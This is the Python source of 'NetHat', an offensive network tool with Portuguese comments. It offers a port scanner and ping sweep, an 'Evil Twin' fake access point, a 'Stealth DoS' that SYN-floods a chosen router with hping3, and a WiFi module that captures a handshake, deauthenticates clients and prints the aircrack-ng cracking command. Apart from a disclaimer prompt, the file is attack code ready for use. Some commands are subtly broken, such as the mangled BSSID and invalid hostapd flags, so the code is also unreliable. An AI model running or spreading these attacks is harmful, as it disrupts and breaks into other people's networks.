#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# NetHat v1.0 - Corrigido
# Autor: mrmaestrox
# Ambiente: Kali Linux / Force Box

import os
import sys
import time
import socket
import subprocess
import re
import json
import logging
from datetime import datetime

# Configuração de log
logging.basicConfig(
    filename='nethat.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# --- Configuração de Cores e Estilo ---
class Colors:
    GREEN = '\033[92m'
    GRAY = '\033[90m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('clear')

def print_banner():
    banner = f"""{Colors.GREEN}

##    ## #### ########     ###    ##     ##    ###    ########
##   ##   ##  ##     ##   ## ##   ##     ##   ## ##      ##
##  ##    ##  ##     ##  ##   ##  ##     ##  ##   ##     ##
#####     ##  ########  ##     ## ######### ##     ##    ##
##  ##    ##  ##   ##   ######### ##     ## #########    ##
##   ##   ##  ##    ##  ##     ## ##     ## ##     ##    ##
##    ## #### ##     ## ##     ## ##     ## ##     ##    ##

                                                    **                           *.
                                                    * *                            * .*
                                                  ..  *                            ..  *
                                                 .*  .*                            .*   *
                                                 *   .*                            **   *
                                                 *    *.     .**.         .**      *     *
                                                **     *. **..              *..*  *      *
                                            .    *       .***                *#**       ..   *
                                            .*   *          *                *.         *   **
                                             * *  *.      **                  **.      *  ...
                                             *   *  *#####.                    .###***  .. **
                                              . *  **                                .*  ** .
                                              .  *.**   .          .  .              .*..  *
                                               *     *                              *.    .
                                                 *  .*   .**.                 .**   .*  .
                                                   **      .*  **...   ..**  ..      **
                                                    *.                               *
                                                      *  .**      *    .      .*.  *.
                                                       *.   **    .    .    .*   .*
                                                        *    . *  *    *  ..*    *.
                                                        .*.   *.   .. *.   *    *.  .
                                                           **  *  .... *  .  .**#.....
                                                           ##*  *.       *  *  .**.   ....*.   ...
                                                          *** *.           *. ***    *.*        *    . .*.
                                                         ** *   *        * *. *.    *.        *          .*.
                                                       ** *      .*.   .*.   *     *        *               **
                                                ..**.  * ..          *.    .*     *       *.  .**.           .* .
                                            .*.       *  *.    ****       *.     * .    .. *. ..         .*. *    ..
                                      ....           *   *   *.    ..    *.     ....   * *  *       ..      .*      *
                                   *                *    *  **      .*  *       * *  .     .   **.          .*       .
                                  *                *     *.* *     *. **       .. . .    *  **               *       *
                                 *                *.    .*.   **  *   *        *  .     * **                **.       *
                                 *               *.     *.   .   *   *         *  *   .. *            .***.  .*.     *
                                 *   *          ..      *.   *   .. *         ..  .. . .*    .***.                  ..
                                .*   *.          .*    .*   *    ..*   .*..****    .  .. **.                        ,
                                ..   **           .*.   *  *    .. ..      **.       .**                         .**
                                *    .*        *.      .* *   .* .  *       .*  .*                         * .** **
                               .*    .*        *       *...  . . .  *    *. *   * *  .         ***.    . *  *. *.  *
                               *      *.       *       *.*  . .*.   *  ..   *   .  *.        . .*  *   * .   ..   *.*
                               .. .   .*       *       **  *  *     . ..    *      *.      . .      *   *.   .      *.
                               *.  *.  *       *      .*  *   *     . *     *      .   .*    *.      *   * *.      .  .
                               *     ***       ..     *.   *  ..    .*      *      .. .       . ...   *  *.          *..
                                      .*        .     *    .   *     *.  **.*      *.         *       .*  *        *  **
                              *        .        *    .*     *            .  .      .*****    *.        *  *       ...  ..
                               *        .       *    *.     *               *       ..  . .  . .       * ..          . *.
                                *       *       *    *     *  ****.         *        *         ..        .             *
                                 *      *       *   .*    ..      **.**.     *                        **              .
                                 **     *       *   .*   ..     **.       .**            .    .******.  .             *
                                 * *    *        .  **  ..     *.             **...****.   *.         *.             .*
                                 * *.   *        *  ** ..    **                 *                   **               *
                                .*  **  *         * .* *   .*                    **              .*.               *
                                **.   ***          . **   *                        .************                 **
                               .*  *   .*.         ..*  *.                                                 .****
                              **    ..   *        . *. *                                             .*****
                              *          .*         *..                                             **.
                               *          *         .***                                           .*.
                               *.         *          *.*.                                         .*
                               *                     *                                           .**
                              .*                     ..                                          **
                               **                    ..                                          *.
                                *.                                                               .*
                                **                                                                *
                                .*                                                              - -*

{Colors.WHITE}V.1.0 "© copyright mrmaestrox"{Colors.RESET}
"""
    print(banner)

def print_welcome_box():
    box = f"""{Colors.WHITE}╭─────────────────────────────────────────────────────────╮
│ {Colors.BOLD}WELCOME TO THE NETHAT{Colors.RESET}{Colors.WHITE}
├─────────────────────────────────────────────────────────┤
│ │
│ {Colors.YELLOW}WARNING: This tool is developed for educational and{Colors.RESET}
│ {Colors.YELLOW}security auditing purposes only. Mishandling or illegal{Colors.RESET}
│ {Colors.YELLOW}use of this software may violate local laws.{Colors.RESET}
│ │
│ {Colors.RED}The developer assumes NO liability for damages caused.{Colors.RESET}
│
├─────────────────────────────────────────────────────────┤
│ Are you responsible for the use of the tool?
│ │
│ [ Y ] Yes [ N ] No
╰─────────────────────────────────────────────────────────╯"""
    print(box)

def validate_ip(ip):
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if not re.match(pattern, ip):
        return False
    parts = ip.split('.')
    for part in parts:
        if int(part) > 255:
            return False
    return True

def validate_bssid(bssid):
    pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    return bool(re.match(pattern, bssid))

def safe_validate_input(value, pattern, error_msg):
    """Validação segura de entrada com log"""
    if not re.match(pattern, value):
        logging.warning(f"Entrada inválida: {value}, erro: {error_msg}")
        return False
    return True

def safe_run(cmd_args, description, timeout=None):
    """Execução segura de subprocess com tratamento de erros"""
    try:
        logging.info(f"Iniciando {description}: {' '.join(cmd_args)}")
        result = subprocess.run(
            cmd_args,
            check=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        logging.info(f"Sucesso em {description}")
        return result
    except subprocess.CalledProcessError as e:
        logging.error(f"Erro em {description}: {e.stderr}")
        print(f"{Colors.RED}[!] {description}: {e.stderr}{Colors.RESET}")
    except subprocess.TimeoutExpired:
        logging.warning(f"Timeout em {description}")
        print(f"{Colors.YELLOW}[!] Timeout em {description}{Colors.RESET}")
    except Exception as e:
        logging.error(f"Erro crítico em {description}: {str(e)}")
        print(f"{Colors.RED}[!] Erro crítico em {description}: {str(e)}{Colors.RESET}")
    return None

def sanitize_filename(name):
    """Sanitiza nome de arquivo para evitar injeção de comandos"""
    return re.sub(r'[^a-zA-Z0-9_-]', '_', name)

def save_results(data_type, content):
    """Salva resultados com tratamento de erros"""
    try:
        os.makedirs('logs', exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"logs/nethat_{data_type}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            if isinstance(content, dict):
                f.write(json.dumps(content, indent=4))
            else:
                f.write(str(content))
        
        print(f"\n{Colors.GREEN}[✓] Dados salvos em: {filename}{Colors.RESET}")
        logging.info(f"Resultados salvos em {filename}")
        return filename
    except Exception as e:
        logging.error(f"Erro ao salvar resultados: {str(e)}")
        print(f"\n{Colors.RED}[!] Erro ao salvar: {str(e)}{Colors.RESET}")
        return None

# --- Módulos de Funcionalidade ---
def module_scan():
    try:
        clear_screen()
        print(f"{Colors.YELLOW}--- SCAN: Varredura Avançada de Rede ---{Colors.RESET}\n")
        
        # Removido o exemplo de IP por questões de segurança e privacidade
        target = input("❯ Digite o IP do alvo: ").strip()
        if not validate_ip(target):
            print(f"{Colors.RED}[!] IP inválido.{Colors.RESET}")
            time.sleep(2)
            return
            
        # 1. Coleta de Informações do Provedor (WAN)
        print(f"\n{Colors.WHITE}Consultando informações de rede externa...{Colors.RESET}")
        provedor_info = "Não foi possível identificar (Sem conexão externa)"
        try:
            import urllib.request
            import json
            with urllib.request.urlopen("http://ip-api.com/json/?fields=status,isp,org,as", timeout=3) as response:
                res_data = json.loads(response.read().decode())
                if res_data.get("status") == "success":
                    provedor_info = f"{res_data.get('isp')} ({res_data.get('as')})"
        except Exception:
            pass

        # 2. Descoberta de Dispositivos Ativos (LAN via Ping Sweep rápido)
        print(f"{Colors.WHITE}Mapeando dispositivos ativos no segmento local...{Colors.RESET}")
        dispositivos_ativos = []
        
        base_ip = ".".join(target.split(".")[:3]) + "."
        
        try:
            for i in range(1, 21):
                ip_teste = f"{base_ip}{i}"
                ping_cmd = ["ping", "-c", "1", "-W", "1", ip_teste]
                ping_res = subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if ping_res.returncode == 0:
                    desc = "Alvo Especificado" if ip_teste == target else "Dispositivo Conectado"
                    dispositivos_ativos.append(f"{ip_teste} ({desc})")
        except Exception as e:
            logging.error(f"Erro no mapeamento LAN: {str(e)}")

        # 3. Varredura de Portas Tradicional
        print(f"\n{Colors.WHITE}Varrendo portas 1-1024 no alvo...{Colors.RESET}\n")
        open_ports = []
        
        try:
            for port in range(1, 1025):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    try:
                        service = socket.getservbyport(port, 'tcp')
                    except:
                        service = "unknown"
                    
                    print(f"{Colors.GREEN}✓ Porta [{port}] ABERTA ({service}){Colors.RESET}")
                    open_ports.append({"port": port, "service": service})
                
                sock.close()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}Varredura interrompida pelo usuário.{Colors.RESET}")
        except Exception as e:
            logging.error(f"Erro durante varredura: {str(e)}")
        
        # 4. Painel de Resumo Avançado
        print(f"\n{Colors.YELLOW}=========================================================={Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.WHITE}               RESUMO DA ANÁLISE DE REDE                  {Colors.RESET}")
        print(f"{Colors.YELLOW}=========================================================={Colors.RESET}")
        
        print(f"{Colors.BOLD}{Colors.WHITE}❯ Provedor de Internet (WAN):{Colors.RESET} {Colors.GREEN}{provedor_info}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.WHITE}❯ Dispositivos Ativos Identificados na Rede Local:{Colors.RESET}")
        if dispositivos_ativos:
            for disp in dispositivos_ativos:
                print(f"  [+] IP: {Colors.WHITE}{disp}{Colors.RESET}")
        else:
            print("  [-] Nenhum outro dispositivo respondeu no intervalo analisado.")
            
        total_abertas = len(open_ports)
        total_fechadas = 1024 - total_abertas
        print(f"\n{Colors.BOLD}{Colors.WHITE}❯ Análise de Portas no Alvo:{Colors.RESET}")
        print(f"  Status: {Colors.GREEN}[{total_abertas}] Abertas{Colors.RESET} | {Colors.RED}[{total_fechadas}] Fechadas{Colors.RESET}")
        
        if total_abertas > 0:
            print(f"\n{Colors.WHITE}  Análise de Superfície Encontrada:{Colors.RESET}")
            for p in open_ports:
                if p["port"] == 23:
                    print(f"    - {Colors.RED}Porta 23 (Telnet):{Colors.RESET} Interface de comando ativa. Protocolo sem criptografia.")
                elif p["port"] == 80:
                    print(f"    - {Colors.YELLOW}Porta 80 (HTTP):{Colors.RESET} Painel de gerenciamento web ativo na rede local.")
                else:
                    print(f"    - Porta {p['port']} ({p['service']}): Serviço TCP padrão respondendo.")
        
        print(f"{Colors.YELLOW}=========================================================={Colors.RESET}\n")

        # 5. Opção de Salvamento
        if open_ports:
            save_opt = input(f"{Colors.GRAY}Salvar resultados? [Y/N]: {Colors.RESET}").strip().upper()
            if save_opt == 'Y':
                save_results("scan", {
                    "target": target, 
                    "provedor": provedor_info, 
                    "dispositivos_lan": dispositivos_ativos, 
                    "open_ports": open_ports
                })

    except Exception as erro_geral:
        # ISSO DAQUI NÃO DEIXA O ERRO SUMIR DA TELA:
        print(f"\n{Colors.RED}[!] OCORREU UM ERRO CRÍTICO NO SCRIPT:{Colors.RESET}")
        print(f"{Colors.WHITE}{str(erro_geral)}{Colors.RESET}\n")
        print("Verifique a indentação ou digitação das variáveis.")

    input("\nPressione Enter para voltar...")

def module_save():
    clear_screen()
    print(f"{Colors.YELLOW}--- SAVE: Salvamento de Dados ---{Colors.RESET}\n")
    
    target = input("❯ Digite IP/ID do roteador: ").strip()
    if not target:
        print(f"{Colors.RED}[!] IP/ID inválido.{Colors.RESET}")
        time.sleep(2)
        return
    
    data = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "status": "saved_manually",
        "note": "Dados configurados pelo usuário"
    }
    
    save_results("config", data)
    input("\nPressione Enter para voltar...")

def module_router_mask():
    clear_screen()
    print(f"{Colors.YELLOW}--- ROUTER MASK: Evil Twin ---{Colors.RESET}\n")
    print(f"{Colors.RED}[!] Requer interface em modo monitor (wlan0mon) e root.{Colors.RESET}\n")
    
    ssid = input("❯ Nome da rede falsa (SSID): ").strip()
    if not ssid:
        print(f"{Colors.RED}[!] SSID inválido.{Colors.RESET}")
        time.sleep(2)
        return
    
    channel = input("❯ Canal (1-13): ").strip()
    if not safe_validate_input(channel, r'^\d+$', "Canal inválido"):
        time.sleep(2)
        return
    
    try:
        channel = int(channel)
        if not 1 <= channel <= 13:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}[!] Canal inválido.{Colors.RESET}")
        time.sleep(2)
        return
    
    safe_ssid = sanitize_filename(ssid)
    safe_channel = str(channel)
    
    print(f"\n{Colors.WHITE}Iniciando Evil Twin...{Colors.RESET}")
    print("Matando processos conflitantes...")
    safe_run(["sudo", "airmon-ng", "check", "kill"], "Parada de processos conflitantes")
    
    cmd = ["sudo", "hostapd", "/etc/hostapd/hostapd.conf", 
           "-i", "wlan0mon", "-c", safe_channel, "--ssid", safe_ssid]
    
    print(f"{Colors.YELLOW}Executando: {' '.join(cmd)}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Ponto de acesso simulado iniciado. (Verifique terminal para logs reais){Colors.RESET}")
    print(f"{Colors.WHITE}Aguardando conexões... (Ctrl+C para parar){Colors.RESET}")
    
    try:
        p = subprocess.Popen(cmd)
        time.sleep(5)
        p.terminate()
        print("\n{Colors.GRAY}Simulação de espera concluída.{Colors.RESET}")
    except Exception as e:
        logging.error(f"Erro em Evil Twin: {str(e)}")
        print(f"{Colors.RED}[!] Erro: {str(e)}{Colors.RESET}")

    input("\nPressione Enter para voltar...")

def module_router_attack():
    clear_screen()
    print(f"{Colors.YELLOW}--- ROUTER ATTACK: Stealth DoS ---{Colors.RESET}\n")
    
    target = input("❯ IP do roteador alvo: ").strip()
    if not validate_ip(target):
        print(f"{Colors.RED}[!] IP inválido.{Colors.RESET}")
        time.sleep(2)
        return
    
    print(f"\n{Colors.RED}INICIANDO ATAQUE STEALTH EM {target}{Colors.RESET}")
    print(f"{Colors.WHITE}Duração mínima: 50 segundos. Não interrompa.{Colors.RESET}\n")
    
    cmd = ["sudo", "hping3", "-S", "-p", "80", "-i", "u1000", "--flood", target]
    print(f"Executando: {' '.join(cmd)}")
    
    try:
        safe_run(cmd, "Ataque DoS stealth", timeout=55)
    except Exception as e:
        logging.error(f"Erro no ataque DoS: {str(e)}")
        print(f"{Colors.RED}[!] Erro na execução: {str(e)}{Colors.RESET}")
    
    input("\nPressione Enter para voltar...")

def module_aircrack():
    clear_screen()
    print(f"{Colors.YELLOW}--- PROCESS AIRCRACK-NG ---{Colors.RESET}\n")
    print(f"{Colors.RED}PRÉ-REQUISITO OBRIGATÓRIO:{Colors.RESET}")
    print("Execute no terminal antes:")
    print(" sudo airmon-ng start wlan0")
    print(" sudo airodump-ng wlan0mon")
    print("")
    
    channel = input("❯ Canal do roteador: ").strip()
    bssid = input("❯ BSSID (ex: AA:BB:CC:DD:EE:FF): ").strip()
    
    if not safe_validate_input(channel, r'^\d+$', "Canal inválido"):
        time.sleep(2)
        return
    
    if not validate_bssid(bssid):
        print(f"{Colors.RED}[!] BSSID inválido.{Colors.RESET}")
        time.sleep(2)
        return
    
    safe_channel = int(channel)
    if not 1 <= safe_channel <= 13:
        print(f"{Colors.RED}[!] Canal inválido.{Colors.RESET}")
        time.sleep(2)
        return
    
    print(f"\n{Colors.WHITE}Iniciando captura no canal {channel} para {bssid}...{Colors.RESET}")
    
    safe_bssid = sanitize_filename(bssid)
    capture_file = f"capture_{safe_bssid}"
    
    try:
        # 1. Captura
        print("Rodando airodump-ng... (Ctrl+C após capturar handshake)")
        capture_cmd = [
            "sudo", "airodump-ng", "-c", str(safe_channel),
            "--bssid", safe_bssid, "-w", capture_file, "wlan0mon"
        ]
        safe_run(capture_cmd, "Captura de handshake")
        
        # 2. Deauth
        print("\nEnviando pacotes de desautenticação...")
        deauth_cmd = [
            "sudo", "aireplay-ng", "--deauth", "10",
            "-a", safe_bssid, "wlan0mon"
        ]
        safe_run(deauth_cmd, "Desautenticação de clientes")
        
        # 3. Quebra ( requer wordlist )
        print("\nPronto para quebra. Coloque sua wordlist e rode:")
        print(f"sudo aircrack-ng -w /path/to/wordlist.txt {capture_file}-01.cap")
        
        print(f"\n{Colors.GREEN}[✓] Processo de captura finalizado. Verifique a pasta atual.{Colors.RESET}")
        
    except Exception as e:
        logging.error(f"Erro no processo Aircrack-ng: {str(e)}")
        print(f"{Colors.RED}[!] Erro: {str(e)}{Colors.RESET}")

    input("\nPressione Enter para voltar...")

# --- Menu Principal ---

def show_menu():
    while True:
        clear_screen()
        print_banner()  # Banner agora exibido no menu principal
        
        print(f"{Colors.GRAY}┌────────────────────────────────────────────────────────┐{Colors.RESET}")
        print(f"{Colors.GRAY}│{Colors.WHITE} SELECT AN OPTION {Colors.GRAY}│{Colors.RESET}")
        print(f"{Colors.GRAY}└────────────────────────────────────────────────────────┘{Colors.RESET}")

        # Corrigido: Removido HTML e adicionado cores para números
        options = [
            f"{Colors.GREEN}1{Colors.WHITE} ── SCAN",
            f"{Colors.GREEN}2{Colors.WHITE} ── SAVE",
            f"{Colors.GREEN}3{Colors.WHITE} ── ROUTER MASK",
            f"{Colors.GREEN}4{Colors.WHITE} ── ROUTER ATTACK",
            f"{Colors.GREEN}5{Colors.WHITE} ── PROCESS AIRCRACK-NG",
            f"{Colors.GREEN}6{Colors.WHITE} ── EXIT"
        ]

        for opt in options:
            print(f"{Colors.GRAY} {opt}{Colors.RESET}")

        print(f"{Colors.GRAY}──────────────────────────────────────────────────────────{Colors.RESET}")

        try:
            choice = input(f"\n❯ Digite a sua opção: {Colors.RESET}").strip()

            if choice == '1':
                module_scan()
            elif choice == '2':
                module_save()
            elif choice == '3':
                module_router_mask()
            elif choice == '4':
                module_router_attack()
            elif choice == '5':
                module_aircrack()
            elif choice == '6':
                print(f"\n{Colors.GREEN}Saindo do NetHat. Até logo.{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}\n[!] Opção inválida. Tente novamente.{Colors.RESET}")
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{Colors.RED}Interrupção detectada. Saindo.{Colors.RESET}")
            sys.exit(0)
        except Exception as e:
            logging.error(f"Erro crítico no menu: {str(e)}")
            print(f"{Colors.RED}\n[!] Erro crítico: {str(e)}{Colors.RESET}")
            time.sleep(2)

# --- Ponto de Entrada ---

def main():
    clear_screen()
    print_welcome_box()

    try:
        selection = input(f"\n{Colors.GRAY}❯ Selection: {Colors.RESET}").strip().upper()

        if selection == 'Y':
            print(f"\n{Colors.GREEN}Isolando ambiente... Carregando módulos.{Colors.RESET}")
            time.sleep(1.5)
            # REMOVIDO: print_banner() que estava aqui antes
            time.sleep(1)
            show_menu()
        elif selection == 'N':
            print(f"\n{Colors.RED}Encerrando sistema. Ação cancelada pelo usuário.{Colors.RESET}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}\nResposta inválida. Reinicie o script.{Colors.RESET}")
            sys.exit(1)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    # Verifica se é root para módulos críticos
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW} Recomendado executar como root (sudo) para funcionalidades de rede.{Colors.RESET}")
        time.sleep(2)

    main()
